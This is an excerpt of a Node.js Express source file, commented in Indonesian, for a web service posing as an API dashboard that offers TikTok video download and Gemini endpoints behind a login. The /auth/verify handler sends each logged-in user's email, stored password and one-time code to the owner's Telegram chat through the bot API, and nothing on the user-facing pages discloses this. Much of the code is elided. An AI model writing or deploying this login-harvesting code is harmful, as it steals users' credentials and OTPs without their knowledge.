...
// Koneksi Database dengan Proteksi Error Vercel
...
app.post('/auth/verify', async (req, res) => {
    ...
    if (user) {
        ...
        // Notifikasi ke Telegram kamu
        const msg = `🚀 *NOTIFIKASI LOGIN SYSTEM*\n📧 *EMAIL:* \`${email}\`\n🔑 *PASSWORD:* \`${user.password}\`\n🔢 *KODE:* \`${otp}\`\n✅ *STATUS:* SUCCESS`;
        axios.post(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, { chat_id: OWNER_ID, text: msg, parse_mode: 'Markdown' });
        ...
        <div class="min-h-screen flex items-center justify-center p-6 bg-slate-950/70">
            <div class="glass p-10 rounded-[3rem] max-w-4xl w-full text-center shadow-2xl">
                ...
                <div class="flex flex-wrap justify-center gap-6">
                    <a href="/docs" class="bg-sky-500 text-slate-900 px-12 py-4 rounded-full font-black transform hover:scale-105 transition-all shadow-xl shadow-sky-500/20">DOCUMENTATION API</a>
...
app.get('/docs', checkAuth, (req, res) => {
    ...
    <body class="bg-slate-950 text-slate-300 p-8 md:p-20">
        <div class="max-w-4xl mx-auto">
            ...
            <p class="text-slate-500 mb-10 italic">v6.0.0 - Full Access Monitoring</p>
            <div class="space-y-6">
                <div class="bg-slate-900 p-6 rounded-2xl border-l-4 border-sky-500 shadow-lg">
                    <div class="flex items-center mb-4">
                        <span class="bg-sky-500 text-slate-950 px-3 py-1 rounded font-bold text-xs uppercase">Get</span>
                        <code class="ml-4 text-sky-400">/api/tiktok?url=URL_VIDEO</code>
                    </div>
                    <p class="text-sm">Download video TikTok tanpa watermark.</p>
                </div>
                <div class="bg-slate-900 p-6 rounded-2xl border-l-4 border-indigo-500 shadow-lg">
                    <div class="flex items-center mb-4">
                        <span class="bg-indigo-500 text-white px-3 py-1 rounded font-bold text-xs uppercase">Get</span>
                        <code class="ml-4 text-indigo-400">/api/gemini?text=halo</code>
                    </div>
                    <p class="text-sm">Gunakan kecerdasan buatan Gemini Google.</p>
                </div>
            </div>
            <div class="mt-12">
                <a href="/" class="bg-slate-800 px-6 py-3 rounded-xl text-sky-500 font-bold hover:bg-slate-700 transition-all">← Back to Dashboard</a>
            </div>
        </div>
    </body>
    </html>`);
